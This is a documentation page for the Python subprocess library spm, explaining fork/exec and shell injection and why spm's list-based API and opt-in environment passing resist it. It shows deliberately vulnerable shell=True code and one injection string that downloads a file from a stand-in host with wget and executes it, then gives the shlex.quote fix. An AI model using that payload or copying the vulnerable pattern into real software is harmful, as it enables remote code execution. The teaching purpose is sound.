Why is spm secure?
==================

There are two ways to execute subprocesses in python:

* The first way is by passing a string to a shell. (``Popen('string', shell=True)``)
* The second one is buy passing a list of arguments to ``exec()``. (``Popen([arguments])``)

How are subprocesses executed
-----------------------------

Subprocesses are executed with two system calls: ``fork()`` and ``exec()``.

* ``fork()`` create a copy of the current subprocess as a child process
* ``exec()`` replaces the current process by another program

Here's how fork works:

.. code:: python

    # This is going to print "Hello" twice
    import os
    os.fork()  # Create two processes running the
    print "Hello"

The previous script will print "Hello" twice. You might be wondering "What is
the point?"

Well — for example — this allow you to run an action in the background (like in
another thread, but without the Python GIL):

.. code:: python

    import os
    import sys

    def run_in_background(action):
        pid = os.fork()
        if pid > 0:  # Parent process
            return  # Return to code calling this funtion
        else:
            try:
                action()
            finally:
                # Kill the subprocess, You don't want it to return to the code
                # calling function, and execute actions twice
                sys.exit()

On the other hand, ``exec()`` allow you to execute a command:

.. code:: python

    import os

    # exec() has 6 different functions which are all
    # doing the same thing with a different interface.
    # execv() is one of them.
    os.execv('/usr/bin/ls', ['ls', '/tmp/'])
    print "This will never be printed"

Running this python script in your shell, would do *exactly* the samething as
running ``ls /tmp`` in your shell. (Assuming ``/usr/bin/`` is in your ``PATH``)

You can also notice that the code after ``execv()`` will never be executed.
Because the whole process is getting replaced by ``/usr/bin/ls``.

So you should know where, we're going. Here's how subprocesses are executed:

.. code:: python

    import os

    # This code is actually a lot more complex, because it includes logic to
    # handle input/output.
    def execute_subprocess(arguments):
        if os.fork() != 0:  # Parent process
            return
        else:  # Child process
            program = arguments[0]
            os.execv(program, arguments)
            # No need to sys.exit() since exec() never returns


How does a shell work?
----------------------

So that you can understand well how a shell works, we'll just implement a very simple one.

A shell just parse each line, and ``fork()`` and ``exec()`` with the arguments
given in the line. It looks up commands in the ``PATH`` environment variable.

For simplicity our shell won't support any environment variable manipulation.

.. literalinclude:: files/shell.py
   :language: python


Shell injection
---------------

In order to do piping easily, most people use ``subprocess.Popen(shell=True)``.

Let's take this example:

.. code:: python

    import subprocess

    # Mypy hinting for documentation
    def does_url_contain(url: str, word: str) -> bool:
        returncode = subprocess.call('curl "{}" | grep "{}"'.format(url, word), shell=True)
        return returncode == 0

Let's imagine you have a web form, in which you ask users to enter this data::

    +-------------------------------------------+
    |    +--------------------------------------|
    | <  |  http://www.example.com/form/       ||
    |    +--------------------------------------|
    +-------------------------------------------+
    |                                           |
    |            +----------------------+       |
    |      Url:  |                      |       |
    |            +----------------------+       |
    |                                           |
    |            +----------------------+       |
    |      Word: |                      |       |
    |            +----------------------+       |
    |                                           |
    +-------------------------------------------+


An attacker could enter, the url:::

    " || wget http://example.net/malware && chmod a+x malware && ./malware #

This would execute the command::

    curl "" || wget http://example.net/malware && chmod a+x malware && ./malware # | grep

And would result in an attacker being able to execute a malware on your system.

In order to mitigate this kind of attack ``does_url_contain`` should have been
implented this way:

.. code:: python

    import subprocess
    import shlex

    def does_url_contain(unsafe_url: str, unsafe_word: str) -> bool:
        url, word = shlex.quote(unsafe_url), shlex.quote(unsafe_word)
        returncode = subprocess.call('curl {} | grep {}'.format(url, word), shell=True)
        return returncode == 0


Why spm isn't vulnerable to shell injection by default
------------------------------------------------------

In order to prevent shell injection, you have to sanitize every piece data
passed to the shell. This requires discipline, and everybody knows that even
with discipline, humans make errors.

On the other hand, ``spm.run()`` doesn't allow for shell injection since it
requires arguments to be passed as a list. (= directly to ``exec()``)

The only way to create shell injection would be to call spm this way (which
defeats the purpose of spm):

.. code:: python

    import spm

    def subcommand(argument): # XXX: This is wrong!!
        return spm.run('bash', '-c', 'subcommand {}'.format(argument))

    # The right way should be:
    import functools
    subcommand = functools.partial(spm.run, 'subcommand')


spm is shellshock proof
^^^^^^^^^^^^^^^^^^^^^^^

Do you remember `shellshock <https://en.wikipedia.org/wiki/Shellshock_(software_bug)>`_? 
Code using ``subprocess.Popen(shell=True)`` could have been vulnerable since
under the hood, it is calling ``/bin/bash -c youstring``.

spm code wouldn't have been vulnerable. (Unless you would have called bash of course.)


You still need spm even though you don't have any user data
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

You might be wondering "why would I need spm if I don't have any user input".

It is recommended to use spm, since it would escape spaces, and things like this.

Also it provides a more pythonic API.


.. _environment_propagation_security:

Environment propagation opt-in
------------------------------

By default, spm doesn't propagate the environment to the subprocess. The user
has to opt-in.

This prevents information leakage. If the environment was propagated by
default, spm run from a CGI script could leak information about the user IP,
Cookies, ...

This also ensure more security. ``LD_PRELOAD`` could be passed down to the
process and execute arbitrary code.

Of course, the environment can alway be propagated. Think twice before
propagating the environment.
